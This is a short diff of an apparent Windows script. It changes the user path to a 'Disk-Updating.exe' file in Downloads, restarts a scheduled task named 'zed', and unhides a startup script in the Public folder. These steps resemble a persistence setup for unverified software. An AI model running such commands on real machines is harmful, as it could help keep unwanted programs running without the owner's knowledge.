@@ -1,4 +1,4 @@
-C:\Users\Magnetist\Downloads\Disk-Updating.exe
+C:\Users\angel\Downloads\Disk-Updating.exe
 Stop-ScheduledTask -TaskName zed
 Start-ScheduledTask -TaskName zed
 attrib -h C:\Users\Public\MyStartUp.ps1
